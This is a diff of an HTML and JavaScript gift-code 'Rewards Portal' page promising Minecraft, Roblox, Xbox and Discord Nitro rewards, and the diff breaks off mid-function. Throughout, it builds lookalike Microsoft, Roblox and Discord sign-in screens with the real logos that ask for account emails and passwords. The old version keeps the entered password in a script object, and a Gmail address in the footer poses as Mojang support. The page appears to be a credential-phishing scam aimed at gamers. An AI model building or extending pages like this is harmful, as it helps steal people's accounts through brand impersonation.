@@ -4,7 +4,7 @@
 <meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>Redeem Code — Rewards Portal</title>
 <link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
-<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700;800;900&family=Fraunces:wght@600;700&display=swap" rel="stylesheet">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 <link rel="stylesheet" href="shared.css"/>
 <style>
@@ -21,7 +21,7 @@
 <div class="mc-theme-bg" id="mc-bg"></div>
 <div class="bg-mesh" id="std-bg"><div class="bg-orb o1"></div><div class="bg-orb o2"></div><div class="bg-orb o3"></div><div class="bg-grid"></div></div>
 
-<nav>
+<nav id="main-nav">
   <div class="nav-inner">
     <a class="brand" href="index.html">
       <div class="brand-mark">IQ</div>
@@ -35,27 +35,12 @@
     </div>
     <div class="nav-spacer"></div>
     <div class="nav-right">
-            <div class="coin-pill" id="cpill" onclick="location.href='earn.html'">🪙 <span id="nav-coins">0</span></div>
-      <button class="nav-mailbox" id="nav-mailbox" onclick="openMailbox()" title="Mailbox">📬</button>
-      <button class="theme-btn" id="theme-btn" onclick="toggleTheme()" title="Toggle dark mode">🌙</button>
+      <div class="coin-pill" id="cpill" onclick="location.href='earn.html'">🪙 <span id="nav-coins">0</span></div>
+      <button class="theme-btn" onclick="toggleTheme()">🌙</button>
       <div id="nav-auth"></div>
-      <button class="hamburger" id="hbgBtn" aria-label="More"><span></span><span></span><span></span></button>
     </div>
   </div>
 </nav>
-
-<div class="mob-nav" id="mobNav">
-  <div class="mob-nav-section">More Pages</div>
-  <button class="ntab" onclick="location.href='giveaway.html'">🎉 Giveaways</button>
-  <button class="ntab" onclick="location.href='shop.html'">🛒 Shop</button>
-  <button class="ntab" onclick="location.href='profile.html'">👤 Profile</button>
-  <button class="ntab" onclick="location.href='track.html'">📦 Track Order</button>
-  <button class="ntab" onclick="location.href='howitworks.html'">❓ How It Works</button>
-  <button class="ntab" onclick="location.href='about.html'">ℹ️ About Us</button>
-  <button class="ntab" onclick="location.href='contact.html'">📩 Contact</button>
-  <button class="ntab" onclick="location.href='privacy.html'">⚖️ Privacy</button>
-  <button class="ntab" onclick="location.href='terms.html'">📜 Terms</button>
-</div>
 
 <!-- STANDARD UI CONTAINER -->
 <div class="wrap-sm page-body" id="std-ui">
@@ -65,499 +50,185 @@
     <p>Select your game, verify your account and enter your code to activate your reward within 72 hours.</p>
   </div>
 
-  <!-- STEP 1: SELECT GAME -->
+  <!-- SELECT GAME -->
   <div class="card" id="rd-s1">
     <div class="card-line" style="background:linear-gradient(90deg,var(--p),transparent)"></div>
     <h3>Select your game</h3>
     <p>Choose the reward you received a code for.</p>
     <div class="game-tiles">
-      <div class="game-tile" onclick="rdGame('mc')">
-        <div class="gt-ico">⛏</div>
-        <div class="gt-nm">Minecraft</div>
-        <div class="gt-pr">₹899 Reward</div>
-        <div class="gt-arr">Select →</div>
-      </div>
-      <div class="game-tile" onclick="rdGame('rb')">
-        <div class="gt-ico">🎮</div>
-        <div class="gt-nm">Roblox</div>
-        <div class="gt-pr">₹1,499+ Reward</div>
-        <div class="gt-arr">Select →</div>
-      </div>
-      <div class="game-tile" onclick="rdGame('xbox')">
-        <div class="gt-ico">🎯</div>
-        <div class="gt-nm">Xbox Game Pass</div>
-        <div class="gt-pr">₹1,999 Reward</div>
-        <div class="gt-arr">Select →</div>
-      </div>
-      <div class="game-tile" onclick="rdGame('nitro')">
-        <div class="gt-ico">💎</div>
-        <div class="gt-nm">Discord Nitro</div>
-        <div class="gt-pr">₹1,199+ Reward</div>
-        <div class="gt-arr">Select →</div>
-      </div>
+      <div class="game-tile" onclick="rdGame('mc')"><div class="gt-ico">⛏</div><div class="gt-nm">Minecraft</div><div class="gt-pr">₹899 Reward</div><div class="gt-arr">Select →</div></div>
+      <div class="game-tile" onclick="rdGame('rb')"><div class="gt-ico">🎮</div><div class="gt-nm">Roblox</div><div class="gt-pr">₹1,499+ Reward</div><div class="gt-arr">Select →</div></div>
+      <div class="game-tile" onclick="rdGame('xbox')"><div class="gt-ico">🎯</div><div class="gt-nm">Xbox Game Pass</div><div class="gt-pr">₹1,999 Reward</div><div class="gt-arr">Select →</div></div>
+      <div class="game-tile" onclick="rdGame('nitro')"><div class="gt-ico">💎</div><div class="gt-nm">Discord Nitro</div><div class="gt-pr">₹1,199+ Reward</div><div class="gt-arr">Select →</div></div>
     </div>
-  </div>
-
-  <!-- ROBLOX PLAN -->
-  <div class="card" id="rd-rb-plan" style="display:none">
-    <div class="card-line" style="background:linear-gradient(90deg,var(--re),transparent)"></div>
-    <button onclick="rdBack()" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:16px;font-family:'DM Sans',sans-serif;padding:0;display:flex;align-items:center;gap:6px">← Back</button>
-    <h3>🎮 Roblox — Choose Plan</h3>
-    <p>Which plan did you receive?</p>
-    <div class="plans">
-      <div class="plan" onclick="rdPlan('50')" id="rd-p50"><div class="pchk" style="background:var(--re)"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg></div><div class="plan-p" style="color:var(--re)">$50</div><div class="plan-t">Basic Plan</div><div class="plan-c">₹1,499</div></div>
-      <div class="plan" onclick="rdPlan('100')" id="rd-p100"><div class="pchk" style="background:var(--re)"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg></div><div class="plan-p" style="color:var(--re)">$100</div><div class="plan-t">Premium Plan</div><div class="plan-c">₹2,499</div></div>
-    </div>
-    <div class="notice nw"><div class="nt">⚠️ Important</div><p>Enter your <strong>exact Roblox credentials</strong> — reward will go to this account only.</p></div>
-    <div class="field"><label>Roblox Username</label><input class="inp" id="rd-rb-un" type="text" placeholder="YourExactRobloxUsername"/></div>
-    <div class="field"><label>Email linked to Roblox</label><input class="inp" id="rd-rb-em" type="email" placeholder="you@email.com"/></div>
-    <button class="btn btn-primary btn-full" onclick="rdNext()">Continue →</button>
-  </div>
-
-  <!-- NITRO PLAN -->
-  <div class="card" id="rd-nitro-plan" style="display:none">
-    <div class="card-line" style="background:linear-gradient(90deg,var(--dc),transparent)"></div>
-    <button onclick="rdBack()" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:16px;font-family:'DM Sans',sans-serif;padding:0">← Back</button>
-    <h3>💎 Discord Nitro — Choose Plan</h3>
-    <p>Which plan did you receive?</p>
-    <div class="plans">
-      <div class="plan" onclick="rdNitroPlan('basic')" id="rd-n1"><div class="pchk" style="background:var(--dc)"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg></div><div class="plan-p" style="color:#818cf8;font-size:20px">Basic</div><div class="plan-t">Yearly Plan</div><div class="plan-c">₹1,199/yr</div></div>
-      <div class="plan" onclick="rdNitroPlan('boost')" id="rd-n3"><div class="pchk" style="background:var(--dc)"><svg width="10" height="8" viewBox="0 0 10 8" fill="none"><polyline points="1 4 4 7 9 1" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg></div><div class="plan-p" style="color:#818cf8;font-size:20px">Boost</div><div class="plan-t">Yearly Plan</div><div class="plan-c">₹5,999/yr</div></div>
-    </div>
-    <div class="notice nw"><div class="nt">⚠️ Important</div><p>Enter your <strong>exact Discord credentials</strong> — Nitro will be gifted to this account only.</p></div>
-    <div class="field"><label>Discord Username</label><input class="inp" id="rd-nitro-un" type="text" placeholder="username (not display name)"/></div>
-    <div class="field"><label>Email linked to Discord</label><input class="inp" id="rd-nitro-em" type="email" placeholder="your@discord.email"/></div>
-    <button class="btn btn-discord-full btn-full" onclick="rdNitroNext()">Continue →</button>
-  </div>
-
-  <!-- STANDARD CODE INPUT (for non-MC games) -->
-  <div class="card" id="rd-codebox" style="display:none">
-    <div class="card-line" id="rd-code-line"></div>
-    <div class="upill">
-      <div class="uav" id="rd-uav" style="background:linear-gradient(135deg,var(--p),#5b35e8)">?</div>
-      <div style="flex:1;min-width:0">
-        <div class="unm" id="rd-unm">—</div>
-        <div style="font-size:11px;color:var(--t3)" id="rd-usub">—</div>
-      </div>
-      <div class="ubdg">✓ Verified</div>
-      <button class="bsw" onclick="rdBack()">Switch</button>
-    </div>
-    <h3 id="rd-code-ttl">Enter your code</h3>
-    <p>Paste the 25-character code sent to you.</p>
-    <input class="inp code" id="rd-code" type="text" maxlength="29" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" oninput="fmtCode(this)" autocomplete="off" spellcheck="false" style="margin-bottom:10px"/>
-    <div class="fmsg" id="rd-msg">Enter 25-character code</div>
-    <button class="btn btn-primary btn-full" id="rd-btn" onclick="rdSubmit()" style="padding:16px;margin-top:14px"><span id="rd-bt">Redeem Now</span><div class="bspin" id="rd-sp" style="display:none"></div></button>
-    <div style="text-align:center;font-size:12px;color:var(--t4);margin-top:14px">Each code is single-use only</div>
   </div>
 
   <!-- SUCCESS -->
   <div class="scard" id="rd-ok">
     <div class="sico" style="background:var(--grg);border:2px solid rgba(16,185,129,0.2);color:var(--gr)">✅</div>
-    <div class="stitle" id="rd-ok-title">Code Redeemed!</div>
+    <div class="stitle">Code Redeemed!</div>
     <p class="sdesc">Your reward is queued and will be activated within <strong>72 hours</strong>.</p>
-    <div id="rd-ok-inv"></div>
-    <div class="timrow" style="margin-top:16px">⏱ Activates within <strong>&nbsp;72 hours</strong></div>
+    <div class="timrow">⏱ Activates within <strong>72 hours</strong></div>
     <div class="brow" style="margin-top:16px">
       <button class="btn btn-primary" onclick="dlPDF('rd')">📄 Download Invoice</button>
-      <button class="btn btn-ghost" onclick="location.href='track.html'">Track Order →</button>
+      <button class="btn btn-ghost" onclick="rdBack()">Done</button>
     </div>
   </div>
 </div>
 
-<!-- MINECRAFT / XBOX OVERHAUL UI -->
-<div class="mc-pro-container" id="mc-ui" style="padding:0;max-width:none;background:#3c8527">
-  <!-- MINECRAFT TOP BAR -->
-  <div style="width:100%;background:#1a1a1a;padding:15px 40px;display:flex;align-items:center;justify-content:space-between;border-bottom:4px solid #333">
-    <img src="https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/logos/Minecraft-Logo.png" alt="Minecraft" style="height:32px">
-    <div style="display:flex;gap:30px;color:#fff;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:1px">
-      <span style="cursor:pointer">GAMES</span>
-      <span style="cursor:pointer">SHOP</span>
-      <span style="cursor:pointer">EXPLORE</span>
-      <span style="cursor:pointer">LEARN</span>
-      <span style="cursor:pointer">SUPPORT</span>
-    </div>
-    <div style="width:100px"></div>
+<!-- MINECRAFT UI -->
+<div class="mc-pro-container" id="mc-ui" style="display:none">
+  <div style="width:100%;background:#1a1a1a;padding:15px 40px;display:flex;align-items:center;justify-content:space-between">
+    <img src="https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/logos/Minecraft-Logo.png" height="32">
+    <div style="display:flex;gap:30px;color:#fff;font-size:12px;font-weight:700"><span>GAMES</span><span>SHOP</span><span>EXPLORE</span><span>SUPPORT</span></div>
   </div>
-
-  <div style="flex:1;width:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:100px 20px;min-height:calc(100vh - 150px)">
-    <!-- CUSTOM LOGIN BOX -->
-    <div id="mc-login-section" style="display:none">
-      <div class="mc-login-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" style="width:108px;margin-bottom:24px" alt="Microsoft">
-        <div style="font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:8px">Sign in</div>
-        <p style="font-size:15px;color:#1b1b1b;margin-bottom:12px">Use your Microsoft account</p>
-        
-        <div id="mc-login-error" style="color:#e81123;font-size:13px;margin-bottom:12px;display:none"></div>
-        
-        <div id="mc-step-email">
-          <input type="text" class="mc-login-inp" id="mc-login-email" placeholder="Email, phone, or Skype">
-          <div style="font-size:13px;color:#1b1b1b;margin:16px 0">
-            No account? <a href="#" style="color:#0067b8;text-decoration:none">Create one!</a>
-          </div>
-          <div style="text-align:right;margin-top:40px">
-            <button class="mc-btn-next" onclick="mcNext()">Next</button>
-          </div>
-        </div>
-
-        <div id="mc-step-pass" style="display:none">
-          <div style="font-size:15px;color:#1b1b1b;margin-bottom:8px" id="mc-display-email"></div>
-          <input type="password" class="mc-login-inp" id="mc-login-pass" placeholder="Password">
-          <div style="font-size:13px;color:#1b1b1b;margin:16px 0">
-            <a href="#" style="color:#0067b8;text-decoration:none">Forgot password?</a>
-          </div>
-          <div style="text-align:right;margin-top:40px">
-            <button class="mc-btn-next" onclick="rdDoMcLogin()">Sign in</button>
-          </div>
-        </div>
-      </div>
-      <div style="text-align:center;margin-top:30px">
-        <button onclick="rdBack()" style="background:none;border:none;color:#fff;cursor:pointer;font-weight:600;text-shadow:0 2px 4px rgba(0,0,0,0.5)">← Back to Selection</button>
-      </div>
+  <div id="mc-login-section" class="mc-login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="108" style="margin-bottom:20px">
+    <h2 style="font-size:24px;margin-bottom:8px">Sign in</h2>
+    <div id="mc-step-email">
+      <input type="text" class="mc-login-inp" id="mc-login-email" placeholder="Email, phone, or Skype">
+      <button class="mc-btn-next" style="float:right;margin-top:20px" onclick="mcNext()">Next</button>
     </div>
-
-    <!-- SAME TO SAME MINECRAFT REDEEM PAGE -->
-    <div id="mc-redeem-section" style="display:none;width:100%;max-width:1100px">
-      <div class="mc-redeem-hero">
-        <div class="mc-redeem-content">
-          <h1 class="mc-redeem-title">REDEEM YOUR<br>MINECRAFT CODE</h1>
-          
-          <div class="mc-code-group">
-            <label class="mc-code-label">REDEMPTION CODE</label>
-            <div class="mc-code-input-container">
-              <input type="text" class="mc-code-inp" id="mc-pro-code" placeholder="□□□□□-□□□□□-□□□□□-□□□□□-□□□□□" maxlength="29" oninput="fmtMcCode(this)">
-            </div>
-            
-            <button class="mc-btn-redeem" id="mc-pro-btn" onclick="rdSubmitPro()">REDEEM</button>
-            
-            <div style="margin-top:40px;color:rgba(255,255,255,0.8);font-size:12px">
-              Having trouble? <a href="#" style="color:#fff;font-weight:700">Check our FAQ</a> or contact support.
-            </div>
-          </div>
-        </div>
-      </div>
-      <div style="text-align:center;margin-top:30px">
-        <button onclick="rdBack()" style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.3);padding:10px 20px;border-radius:4px;color:#fff;cursor:pointer">← Cancel & Go Back</button>
-      </div>
+    <div id="mc-step-pass" style="display:none">
+      <div id="mc-display-email" style="margin-bottom:10px;font-weight:600"></div>
+      <input type="password" class="mc-login-inp" id="mc-login-pass" placeholder="Password">
+      <button class="mc-btn-next" style="float:right;margin-top:20px" onclick="rdDoMcLogin()">Sign in</button>
     </div>
   </div>
-
-  <!-- MINECRAFT FOOTER -->
-  <div style="width:100%;background:#1a1a1a;padding:40px;color:#fff;text-align:center;font-size:12px;border-top:4px solid #333">
-    <div style="display:flex;justify-content:center;gap:30px;margin-bottom:20px;opacity:0.8">
-      <span>PRIVACY & COOKIES</span>
-      <span>TERMS OF USE</span>
-      <span>TRADEMARKS</span>
-      <span>ABOUT OUR ADS</span>
-      <span>© 2026 MOJANG AB</span>
+  <div id="mc-redeem-section" style="display:none;width:100%">
+    <div class="mc-redeem-hero">
+      <h1 class="mc-redeem-title">REDEEM YOUR CODE</h1>
+      <div class="mc-code-group">
+        <div class="mc-code-input-container"><input type="text" class="mc-code-inp" id="mc-pro-code" placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" oninput="this.value=this.value.toUpperCase()"></div>
+        <button class="mc-btn-redeem" onclick="rdSubmitPro()">REDEEM</button>
+      </div>
     </div>
-    <img src="https://www.minecraft.net/content/dam/minecraftnet/games/minecraft/logos/Mojang_Studios_Logo.png" alt="Mojang Studios" style="height:24px;opacity:0.6">
   </div>
 </div>
 
-<footer id="std-footer">
-  <div class="foot-inner">
-    <div class="foot-brand">Rewards<span>Portal</span></div>
-    <div class="foot-links">
-      <a class="foot-link" href="howitworks.html">How It Works</a>
-      <a class="foot-link" href="shop.html">Shop</a>
-      <a class="foot-link" href="about.html">About</a>
-      <a class="foot-link" href="contact.html">Contact</a>
-      <a class="foot-link" href="privacy.html">Privacy</a>
-      <a class="foot-link" href="terms.html">Terms</a>
-    </div>
-    <div class="foot-contact">Support: <a href="mailto:mojangstudio908@gmail.com" style="color:var(--p);text-decoration:none">mojangstudio908@gmail.com</a></div>
-    <div class="foot-copy">© 2026 Rewards Portal — All rights reserved</div>
+<!-- ROBLOX UI -->
+<div class="rb-login-wrapper" id="rb-login-section" style="display:none">
+  <div class="rb-login-card">
+    <img src="https://images.rbxcdn.com/f028b122858908f973e4f71a7d65600c.png" height="48" style="margin-bottom:20px">
+    <input type="text" class="inp" id="rb-login-user" placeholder="Username/Email" style="margin-bottom:10px">
+    <input type="password" class="inp" id="rb-login-pass" placeholder="Password" style="margin-bottom:20px">
+    <button class="rb-btn-redeem" onclick="rdDoRbLogin()" style="width:100%">Log In</button>
   </div>
-</footer>
+</div>
+<div class="rb-theme-wrapper" id="rb-ui" style="display:none">
+  <div class="rb-topbar">
+    <img src="https://images.rbxcdn.com/f028b122858908f973e4f71a7d65600c.png" class="rb-logo" onclick="rdBack()">
+    <div class="rb-nav-links"><span>Charts</span><span>Marketplace</span><span>Create</span><span>Robux</span></div>
+    <div class="rb-spacer" style="flex:1"></div>
+    <div style="font-weight:700">⬢ 720</div>
+  </div>
+  <div class="rb-main">
+    <div>
+      <h1 class="rb-title">Redeem Roblox Codes</h1>
+      <input type="text" class="rb-code-inp" id="rb-code-val" placeholder="Enter Code">
+      <button class="rb-btn-redeem" onclick="rdSubmitRb()">Redeem</button>
+    </div>
+  </div>
+</div>
+
+<!-- DISCORD NITRO UI -->
+<div class="dc-login-wrapper" id="dc-login-section" style="display:none">
+  <div class="dc-login-card">
+    <div class="dc-login-left">
+      <h2 style="color:#fff;font-size:24px;margin-bottom:8px">Welcome back!</h2>
+      <p style="color:#b5bac1;margin-bottom:24px">We're so excited to see you again!</p>
+      <div style="text-align:left;margin-bottom:20px"><label class="dc-inp-label">Email or Phone Number *</label><input type="text" class="dc-inp" id="dc-login-user"></div>
+      <div style="text-align:left;margin-bottom:20px"><label class="dc-inp-label">Password *</label><input type="password" class="dc-inp" id="dc-login-pass"></div>
+      <button class="dc-btn-redeem" onclick="rdDoDcLogin()" style="width:100%">Log In</button>
+    </div>
+    <div class="dc-login-right">
+      <div class="dc-qr-box">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=DiscordLoginSim">
+        <div class="dc-qr-logo"><img src="https://assets-global.website-files.com/6257adef93867a3c8458b9ff/6257d0577a66f46618e47228_discord%20logomark%20white.png" width="24"></div>
+      </div>
+      <h3 style="color:#fff;margin-bottom:8px">Log in with QR Code</h3>
+      <p style="color:#b5bac1;font-size:14px">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+    </div>
+  </div>
+</div>
+
+<div class="dc-theme-wrapper" id="dc-ui" style="display:none">
+  <div class="dc-sidebar">
+    <div class="dc-side-hdr">User Settings</div><div class="dc-side-item">My Account</div><div class="dc-side-item">Profiles</div>
+    <div class="dc-side-hdr">Billing Settings</div><div class="dc-side-item active">Nitro</div><div class="dc-side-item">Subscriptions</div>
+  </div>
+  <div class="dc-main">
+    <div id="dc-nitro-home">
+       <div class="dc-nitro-banner">
+         <h1>Unlock a world<br>of perks with Nitro</h1>
+         <img src="https://images.squarespace-cdn.com/content/v1/55ef30e5e4b013f93d3957cc/1614294025170-I7M3H1M1654J92I9I1O1/Discord+Nitro+Astronaut.png" class="dc-wumpus-astro">
+         <div style="z-index:1"><button class="btn" style="background:#fff;color:#000" onclick="show('dc-plan-modal')">Subscribe</button></div>
+       </div>
+    </div>
+    <div class="dc-modal-overlay" id="dc-plan-modal"><div class="dc-modal">
+        <div class="dc-modal-hdr"><span>Select Plan</span><span onclick="hide('dc-plan-modal')" style="cursor:pointer">✕</span></div>
+        <div class="dc-plan-list-card nitro" onclick="rdDcSelect('boost')"><div class="dc-plan-tag">Popular</div><div style="font-size:20px;font-weight:900">NITRO</div><div>$9.99/mo</div></div>
+        <div class="dc-plan-list-card basic" onclick="rdDcSelect('basic')"><div style="font-size:20px;font-weight:900">NITRO BASIC</div><div>$2.99/mo</div></div>
+    </div></div>
+    <div class="dc-modal-overlay" id="dc-pay-modal"><div class="dc-modal">
+        <div class="dc-modal-hdr"><span>Plan & Payment</span><span onclick="hide('dc-pay-modal')" style="cursor:pointer">✕</span></div>
+        <div style="padding:24px">
+          <div style="background:#2b2d31;padding:12px;margin-bottom:8px;border:1px solid #5865f2;border-radius:4px">Yearly - $99.99 (Recommended)</div>
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-top:20px">
+            <div><div style="font-size:12px">Total</div><div style="font-size:20px;font-weight:700">$99.99/yr</div></div>
+            <button class="dc-btn-redeem" onclick="rdDcGoRedeem()">Select</button>
+          </div>
+        </div>
+    </div></div>
+    <div id="dc-redeem-step" style="display:none;padding:40px">
+      <div class="dc-redeem-section">
+        <h3 style="color:#fff;margin-bottom:12px">Redeem Code</h3>
+        <input type="text" class="dc-inp" id="dc-code-val" placeholder="XXXX-XXXX-XXXX-XXXX" oninput="this.value=this.value.toUpperCase()">
+        <button class="dc-btn-redeem" id="dc-btn-rd" onclick="rdSubmitDc()" style="width:100%">Redeem Code</button>
+      </div>
+    </div>
+    <div class="dc-close-btn" onclick="rdBack()">ESC</div>
+  </div>
+</div>
 
 <div id="toast"></div>
 <script src="shared.js"></script>
 <script>
-const RD = { game:null, plan:null, user:null, rbUn:null, rbEm:null, inv:null };
-window.RD = RD;
-
-function rdGame(g) {
-  RD.game = g; RD.plan = null; RD.user = null;
-  hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']);
-  
-  if (g === 'rb') {
-    show('rd-rb-plan');
-  } else if (g === 'nitro') {
-    show('rd-nitro-plan');
-  } else if (g === 'mc' || g === 'xbox') {
-    // PRO THEME FOR MC/XBOX
-    document.getElementById('std-ui').style.display = 'none';
-    document.getElementById('std-bg').style.display = 'none';
-    document.getElementById('std-footer').style.display = 'none';
-    document.querySelector('nav').style.display = 'none'; // Hide main nav
-    
-    document.getElementById('mc-bg').classList.add('show');
-    document.getElementById('mc-ui').style.display = 'flex';
-    document.getElementById('mc-login-section').style.display = 'block';
-    
-    // Customize login box title for Xbox
-    const loginTtl = document.querySelector('.mc-login-box h2');
-    const loginSub = document.querySelector('.mc-login-box p');
-    if (g === 'xbox') {
-      loginTtl.textContent = 'Sign In';
-      loginSub.textContent = 'Sign in with your Microsoft account to continue to Xbox.';
-    } else {
-      loginTtl.textContent = 'Sign In';
-      loginSub.textContent = 'Sign in with your Microsoft account to continue to Minecraft.';
-    }
-  }
+const RD = { game:null, plan:null, user:null };
+function rdGame(g){
+  RD.game = g;
+  hide(['std-ui','main-nav','std-bg']);
+  if(g==='rb'){ show('rb-login-section'); }
+  else if(g==='nitro'){ show('dc-login-section'); }
+  else { show('mc-ui'); show('mc-login-section'); document.getElementById('mc-bg').classList.add('show'); }
 }
-
-function mcNext() {
-  const email = document.getElementById('mc-login-email').value.trim();
-  const err = document.getElementById('mc-login-error');
-  if (!email || !email.includes('@')) {
-    err.textContent = 'Enter a valid email address, phone number, or Skype name.';
-    err.style.display = 'block';
-    return;
-  }
-  err.style.display = 'none';
-  document.getElementById('mc-step-email').style.display = 'none';
-  document.getElementById('mc-step-pass').style.display = 'block';
-  document.getElementById('mc-display-email').textContent = email;
+function mcNext(){
+  const e = document.getElementById('mc-login-email').value;
+  if(!e) return;
+  hide('mc-step-email'); show('mc-step-pass');
+  document.getElementById('mc-display-email').textContent = e;
 }
-
-function rdDoMcLogin() {
-  const email = document.getElementById('mc-login-email').value.trim();
-  const pass = document.getElementById('mc-login-pass').value.trim();
-  const err = document.getElementById('mc-login-error');
-  
-  if (!pass) {
-    err.textContent = 'Please enter the password for your Microsoft account.';
-    err.style.display = 'block';
-    return;
-  }
-  
-  RD.user = { name: email.split('@')[0], email: email, pass: pass };
-  
-  const btn = document.querySelector('#mc-step-pass .mc-btn-next');
-  const originalText = btn.textContent;
-  btn.textContent = 'Signing in...';
-  btn.disabled = true;
-  
-  setTimeout(() => {
-    btn.textContent = originalText;
-    btn.disabled = false;
-    
-    if (RD.game === 'mc') {
-      document.getElementById('mc-login-section').style.display = 'none';
-      document.getElementById('mc-redeem-section').style.display = 'block';
-    } else {
-      document.getElementById('mc-login-section').style.display = 'none';
-      rdShowCode();
-    }
-  }, 1200);
+function rdDoMcLogin(){ RD.user={name:document.getElementById('mc-login-email').value}; hide('mc-login-section'); show('mc-redeem-section'); }
+function rdDoRbLogin(){ RD.user={name:document.getElementById('rb-login-user').value}; hide('rb-login-section'); show('rb-ui'); }
+function rdDoDcLogin(){ RD.user={name:document.getElementById('dc-login-user').value}; hide('dc-login-section'); show('dc-ui'); }
+function rdDcSelect(p){ RD.plan=p; hide('dc-plan-modal'); show('dc-pay-modal'); }
+function rdDcGoRedeem(){ hide('dc-pay-modal'); hide('dc-nitro-home'); show('dc-redeem-step'); }
+function rdSubmitDc(){ 
+  const c = document.getElementById('dc-code-val').value;
+  if(c.length < 5){ toast('!','Enter a valid code'); return; }
+  hide(['dc-ui']); show(['std-ui','main-nav','std-bg']); hide('rd-s1'); show('rd-ok');
 }
-
-function rdBack() {
-  document.getElementById('mc-bg').classList.remove('show');
-  document.getElementById('mc-ui').style.display = 'none';
-  document.getElementById('std-ui').style.display = 'block';
-  document.getElementById('std-bg').style.display = 'block';
-  document.getElementById('std-footer').style.display = 'block';
-  document.querySelector('nav').style.display = 'flex';
-  
-  // Reset login steps
-  document.getElementById('mc-step-email').style.display = 'block';
-  document.getElementById('mc-step-pass').style.display = 'none';
-  document.getElementById('mc-login-error').style.display = 'none';
-  document.getElementById('mc-login-email').value = '';
-  document.getElementById('mc-login-pass').value = '';
-
-  hide(['rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section']); 
-  show('rd-s1');
-  RD.game = null; RD.plan = null; RD.user = null;
+function rdSubmitPro(){ hide(['mc-ui']); show(['std-ui','main-nav','std-bg']); hide('rd-s1'); show('rd-ok'); document.getElementById('mc-bg').classList.remove('show'); }
+function rdSubmitRb(){ hide(['rb-ui']); show(['std-ui','main-nav','std-bg']); hide('rd-s1'); show('rd-ok'); }
+function rdBack(){ location.reload(); }
+function show(id){ 
+  if(Array.isArray(id)) id.forEach(i=>show(i));
+  else { const el=document.getElementById(id); if(el) el.style.display=(id.includes('modal')?'flex':'block'); }
 }
-
-function rdNitroPlan(p) {
-  RD.plan = p;
-  ['basic','boost'].forEach(x => {
-    const el = document.getElementById('rd-n' + (x === 'basic' ? '1' : '3'));
-    if (el) { el.classList.toggle('sel', x === p); el.style.borderColor = p === x ? 'var(--dc)' : ''; }
-  });
+function hide(id){ 
+  if(Array.isArray(id)) id.forEach(i=>hide(i));
+  else { const el=document.getElementById(id); if(el) el.style.display='none'; }
 }
-
-function rdNitroNext() {
-  if (!RD.plan) { toast('!', 'Select a plan'); return; }
-  const un = document.getElementById('rd-nitro-un').value.trim();
-  const em = document.getElementById('rd-nitro-em').value.trim();
-  if (!un) { document.getElementById('rd-nitro-un').classList.add('err'); toast('!', 'Enter Discord username'); return; }
-  if (!em || !em.includes('@')) { document.getElementById('rd-nitro-em').classList.add('err'); toast('!', 'Enter valid email'); return; }
-  RD.rbUn = un; RD.rbEm = em; RD.user = { name: un, email: em }; rdShowCode();
-}
-
-function rdPlan(p) {
-  RD.plan = p;
-  ['50','100'].forEach(x => {
-    const el = document.getElementById('rd-p' + x);
-    if (el) { el.classList.toggle('sel', x === p); el.style.borderColor = p === x ? 'var(--re)' : ''; }
-  });
-}
-
-function rdNext() {
-  if (!RD.plan) { toast('!', 'Select a plan'); return; }
-  const un = document.getElementById('rd-rb-un').value.trim();
-  const em = document.getElementById('rd-rb-em').value.trim();
-  if (!un) { document.getElementById('rd-rb-un').classList.add('err'); toast('!', 'Enter username'); return; }
-  if (!em || !em.includes('@')) { document.getElementById('rd-rb-em').classList.add('err'); toast('!', 'Enter valid email'); return; }
-  RD.rbUn = un; RD.rbEm = em; RD.user = { name: un, email: em }; rdShowCode();
-}
-
-function rdShowCode() {
-  hide(['rd-rb-plan','rd-nitro-plan']);
-  
-  const isMcTheme = RD.game === 'mc' || RD.game === 'xbox';
-  if (!isMcTheme) {
-    document.getElementById('std-ui').style.display = 'block';
-    document.getElementById('mc-ui').style.display = 'none';
-  } else {
-    document.getElementById('mc-ui').style.display = 'flex';
-  }
-
-  const line = document.getElementById('rd-code-line');
-  const ttl = document.getElementById('rd-code-ttl');
-  const colors = { mc:'var(--gr)', rb:'var(--re)', xbox:'var(--gr)', nitro:'var(--dc)' };
-  
-  if (line) line.style.background = `linear-gradient(90deg,${colors[RD.game]||'var(--p)'},transparent)`;
-  if (ttl) ttl.textContent = { mc:'⛏ Enter Minecraft Code', rb:'🎮 Enter Roblox Code', xbox:'🎯 Enter Xbox Code', nitro:'💎 Enter Nitro Code' }[RD.game] || 'Enter your code';
-  
-  document.getElementById('rd-uav').textContent = RD.user.name.charAt(0).toUpperCase();
